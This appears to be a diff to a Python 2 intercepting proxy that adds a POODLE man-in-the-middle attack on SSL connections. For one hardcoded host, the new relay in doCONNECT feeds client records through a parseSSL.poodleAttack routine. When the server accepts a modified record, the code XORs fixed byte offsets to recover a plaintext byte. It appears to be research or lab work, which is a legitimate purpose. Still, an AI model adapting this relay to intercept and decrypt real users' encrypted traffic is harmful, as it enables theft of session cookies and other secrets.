@@ -30,6 +30,7 @@ import os
 import urllib
 import ssl
 import copy
+import parseSSL
 
 from history import *
 from http import *
@@ -45,7 +46,6 @@ class ProxyHandler(SocketServer.StreamRequestHandler):
         self.peer = False
         self.keepalive = False
         self.target = None
-        self.tunnel_mode = False
         # Just for debugging
         self.counter = 0
         self._host = None
@@ -92,9 +92,7 @@ class ProxyHandler(SocketServer.StreamRequestHandler):
 
     def handle(self):
         global proxystate
-        if self.tunnel_mode:
-            self.doFORWARD()
-            return
+
         if self.keepalive:
             if self.peer:
                 HTTPSUtil.wait_read(self.request)
@@ -180,61 +178,71 @@ class ProxyHandler(SocketServer.StreamRequestHandler):
         return data
 
     def doCONNECT(self, host, port, req):
-        #global proxystate
+       #global proxystate
         self.tunnel_mode = True
-        self.tunnel_host = host
-        self.tunnel_port = port
         #socket_req = self.request
         #certfilename = DEFAULT_CERT_FILE
         #socket_ssl = ssl.wrap_socket(socket_req, server_side = True, certfile = certfilename, 
                                      #ssl_version = ssl.PROTOCOL_SSLv23, do_handshake_on_connect = False)
         HTTPSRequest.sendAck(self.request)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, port))
+        self._sock_read_write(s, max_idling=300, attack=(host=="www.kehanw.com"))
         #print "Send ack to the peer %s on port %d for establishing SSL tunnel" % (host, port)
-        print "into forward mode: %s : %s" % (host, port)
-        '''
-        host, port = socket_req.getpeername()
-        proxystate.log.debug("Send ack to the peer %s on port %d for establishing SSL tunnel" % (host, port))
+        #print " forward mode: %s : %s" % (host, port)
+    def _sock_read_write(self, soc, data=None, max_idling=20, attack=False):
+        """The following function simply outputs into the socket everything
+        that it gets from the client connection. This is the fastest way of
+        performing proxy-like communication although requests and responses
+        cannot be easily observed."""
         
+        '''
+          Client =====(self.connection)=Proxy =(soc)====== Server
+        '''
+        
+        if data is not None:
+            soc.send(data)
+
+        iw = [self.connection, soc]
+        ow = []
+
+        count = 0
+        attacked = False
+        # perform basic input and output operations
         while True:
-            try:
-                socket_ssl.do_handshake()
+            count += 1
+            (ins, _, exs) = select.select(iw, ow, iw, 3)
+            if exs:
                 break
-            except (ssl.SSLError, IOError) as e:
-                # proxystate.log.error(e.__str__())
-                print e.__str__()
-                return
-
-        # Switch to new socket
-        self.peer    = True
-        self.request = socket_ssl
-
-        self.setup()
-        self.handle()
-'''
-    def doFORWARD(self):
-        host, port = self.request.getpeername()
-        #print "client_host", host
-        #print "client_port", port
-        print self.tunnel_host
-        print self.tunnel_port
-        print self.rfile.read()
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((self.tunnel_host, self.tunnel_port))
-            s.sendall(self.rfile.read())
-            s.setblocking(0)
-            print self.rfile.read()
-            data = []
-            chunk = s.recv(1024)
-            while len(chunk) != 0:
-                print chunk
-                data.append(chunk)
-                chunk = s.recv(1024)
-            s.close()
-            self.request.sendall(b''.join(data))
-        except socket.error as e:
-            print e.__str__()
-        print "send %d bytes to %s : %s"%(len(data),host, port)
+            if ins:
+                for i in ins:
+                    if i is soc:
+                        out = self.connection
+                    else:
+                        out = soc
+                    try: data = i.recv(8192) # if not catched, the statement may fail when SSL! bug?
+                    except: data = ''
+                    if data:
+                        if attack and i is self.connection:
+                            #print "%s---%d"%soc.getsockname()
+                            (attackedData, attacked) = parseSSL.poodleAttack(data)
+#                             if not parseSSL.comparePackets(data, attackedData): 
+#                                 parseSSL.printRawSSL(data)
+#                                 parseSSL.printRawSSL(attackedData)
+                            out.send(attackedData)
+                        else:
+                            if attack and attacked and i is soc and ord(data[0]) != 0x15:
+                                print "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$"
+                                parseSSL.printRawSSL(data)
+                                parseSSL.printRawSSL(attackedData)
+                                print "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$"
+                                lenData = len(attackedData)
+                                print chr(ord(attackedData[lenData-17]) ^ 15 ^ ord(attackedData[lenData-65]))
+                            out.send(data)
+                            count = 0
+            if count == max_idling:
+                break
+        
 
     def _getresponse(self, conn):
         try:
